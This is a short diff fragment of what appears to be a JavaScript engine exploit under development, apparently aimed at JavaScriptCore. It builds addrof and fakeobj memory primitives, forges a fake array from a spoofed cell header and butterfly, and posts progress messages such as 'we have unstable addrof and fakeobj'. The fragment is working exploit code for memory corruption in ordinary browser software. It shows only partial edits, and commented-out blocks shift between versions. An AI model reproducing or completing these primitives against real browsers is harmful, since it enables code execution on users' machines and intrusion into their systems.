@@ -414,8 +414,9 @@ function iv(x){
               a1[offset] = dec2f(addr);
               return b1[0];
             }
+            port.postMessage("shall we proceed? we have unstable addrof and fakeobj")
 
-            let obj = {
+            /*let obj = {
               jsCellHeader: dec2f(unboxDouble(doubleArrayCellHeader)),
               fakeButterfly: a0
             };
@@ -423,7 +424,7 @@ function iv(x){
             let addr = addrof(obj);
             port.postMessage("obj @ " + addr.toString(16));
 
-            /*let fakeArr = fakeobj(Add(addr,0x10));
+            let fakeArr = fakeobj(Add(addr,0x10));
 
             // subtract off the incref
             doubleArrayCellHeader = f2dec(fakeArr[0]) - 0x1n;
